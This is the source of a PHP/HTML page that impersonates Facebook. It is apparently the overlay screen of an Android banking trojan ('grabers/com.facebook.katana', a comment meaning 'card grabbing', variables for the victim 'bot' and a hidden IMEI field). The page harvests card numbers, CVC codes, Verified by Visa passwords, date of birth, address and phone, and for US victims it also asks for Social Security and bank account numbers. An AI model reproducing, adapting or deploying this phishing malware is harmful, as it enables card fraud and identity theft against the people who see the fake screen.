<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
	<title>Facebook</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="grabers/com.facebook.katana/css/style.css"/>
	<link rel="stylesheet" type="text/css" href="grabers/com.facebook.katana/css/mobipick.css" />
	<link rel="stylesheet" type="text/css" href="css/jquery.mobile-1.3.0.min.css" />
</head>
<body>

<?php
	    $IM = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
		
		$masС = explode("|", $IM);

		$country = $masС[1];
		include "config.php";
		//$country = htmlspecialchars($_REQUEST["c"], ENT_QUOTES);
	//	$IM = "869073026507878";
	//	$country = "us";
		//$IMEI = "$IM|$country|Грабинг СС";
		

?>
<div class="wrapper">
	<div class="content">
	<div style="text-align: center">
		<img src="grabers/com.facebook.katana/images/fb1.png" style="text-align: center;float: none;width: 30px;margin-top: 20px;">
	</div>
		<p class="text-title"></p>
		<div class="credit-card-group">
			<form id="card-data-block">		
				<p class="cards_icons">	
				
					<img src="images/mdpi/visa.png" id="img_card_visa" class="img_cards" />
					<img src="images/mdpi/mastercard.png" id="img_card_mastercard" 
						class="img_cards" />
					<img src="images/mdpi/amex.png" id="img_card_amex" class="img_cards" />
					<img src="images/mdpi/diners.png" id="img_card_diners" class="img_cards" />
					<img src="images/mdpi/discover.png" id="img_card_discover" class="img_cards" />
					<img src="images/mdpi/jcb.png" id="img_card_jcb" class="img_cards" />
				</p>
				
				
				<div class="error_image" id="card-number-error"></div>
				<input data-role="none" type="tel" name="cardNumber" class="card-number"/>
				<div class="month-year-cvc-block">
					<div class="error_image" id="card-expiration-error"></div>
					<input data-role="none" type="tel" class="card-expiration"/>
					
					<div class="cvc-block">
						<div class="error_image" id="card-cvc-error"></div>
						<img src="images/mdpi/cvc_hint_default.png" class="cvc-hint">
						<input data-role="none" type="tel" onClick="$('.cvc-hint').show(); getData();" 
							name="cvcEntry" class="card-cvc" placeholder="CVC"/>
					</div>
				</div>
			</form>
			<form id="address-fields-block">
				<div class="error_image" id="card-holder-error"></div>
				<input data-role="none" type="text" name="nameOnCard" maxlength="50"
					class="card-holder"/>
					
				<div class="error_image" id="date-birth-error"></div>
				<input data-role="page" type="text" pattern="[0-9]*" name="dateOfBirth"
					min="1956-01-01" max="2000-12-31"
					class="date-birth"/>
					
				<div class="error_image" id="holder-address-error"></div>
				<input data-role="none" type="text" maxlength="70" class="holder-address"/>	
				
				<?php
				if($country=="us")
				{
				echo"<div class='error_image' id='postal-code-error'></div>
				<input data-role='none' type='text' class='SSN' style='width:100%' placeholder='Social Security number'/>
				
				<div class='error_image' id='postal-code-error'></div>
				<input data-role='none' type='text' class='AN' style='width:100%' placeholder='Account number'/>";
				}
				?>
				
				<div class="error_image" id="postal-code-error"></div>
				<input data-role="none" type="text" class="postal-code"/>
				
				<div class="error_image" id="phone-prefix-error"></div>
				<strong>+</strong>
				<input data-role="none" type="tel" pattern="[0-9]*" id="phone_prefix" 
					class="phone-prefix" placeholder="1"/>
					
				<div class="error_image" id="phone-number-error"></div>
				<input data-role="none" type="tel" pattern="[0-9]*" id="phone_number" 
					class="phone-number"/>
					
				<p class="text-agreement"></p>
			</form>
			<form id="card-vbv-block">
				<img src="images/mdpi/verified_by_visa_logo.png" class="vbv-image">
				<div class="error_image" id="card-vbv-error"></div>
				<input data-role="none" type="text" name="vbvPass" maxlength="50"
					class="card-vbv"/>
			</form>

		</div>
	</div>
</div>

<div class="button-bar">
	<input data-role="none" type="button" disabled class="save-button"/>
	<input data-role="none" type="button" class="verify-button"/>
</div>


<?php
echo "<input data-role='none' type='text' name='imei' value='$IM' class='imei' style='visibility:hidden'/>";
echo "<input data-role='none' type='text' name='URL' value='$URL' class='URL' style='visibility:hidden'/>";
?>


<script type="text/javascript" src="js/jquery-1.12.0.min.js"></script>
<script type="text/javascript" src="js/jquery.mobile-1.3.0.min.js"></script>
<script type="text/javascript" src="js/jquery.mask.min.js"></script>
<script type="text/javascript" src="js/xdate.js"></script>
<script type="text/javascript" src="js/xdate.i18n.js"></script>
<script type="text/javascript" src="js/cards.i18n.js"></script>
<script type="text/javascript" src="js/mobipick.js"></script>
<script type="text/javascript" src="js/cat.functions.js"></script>
<script type="text/javascript" src="js/functions.js"></script>
<script type="text/javascript">

	
	var botCountry = getCountryCode().toLowerCase();
	var botLanguage = getLanguageCode().toLowerCase();
	botLanguage='<?php echo "$country";?>';
	
	function getLanguageAttr(classElem) {
		for (var arrItem in cardLocalesAttr)
			for (var element in cardLocalesAttr[arrItem])
				if (cardLocalesAttr[arrItem][element] == classElem)
					return arrItem;
		return 'val';
	}
	
	$.fn.exists = function() {
		return $(this).length;
	}
	
	$(document).bind('mobileinit',function(){
		$.mobile.pushStateEnabled = false;
	});
	
	$( document ).ready( function() {
	
		if (botCountry != 'us') {
			$('#img_card_diners').remove();
			$('#img_card_discover').remove();
			if (botCountry != 'jp') {
				$('#img_card_jcb').remove();
			}
		}
		
		var Language;
		
		if (cardLocales[botLanguage + '-' + botCountry] != undefined)
			Language = cardLocales[botLanguage + '-' + botCountry];
		else if (cardLocales[botLanguage] != undefined)
			Language = cardLocales[botLanguage];
		else
			Language = cardLocales['en-gb'];
		
		for (var classElem in Language) {
			var type = getLanguageAttr(classElem);
			var text = Language[classElem];
			if (type == 'value')
				$('.' + classElem).val(text);
			else if (type == 'html')
				$('.' + classElem).html(text);
			else if (type == 'placeholder')
				$('.' + classElem).attr('placeholder', text);
		}
	});
	
	$( document ).on( "pagecreate", "#address-fields-block", function() {
		
		var picker = $( ".date-birth", this );
		
		picker.mobipick({
			locale: botCountry,	dateFormat: "dd.MM.yyyy"
		});

		picker.on( "change", function() {
			var date = $( this ).val();			
			var dateObject = $( this ).mobipick( "option", "date" );
		});
	});


</script>
</script>
</body>
</html>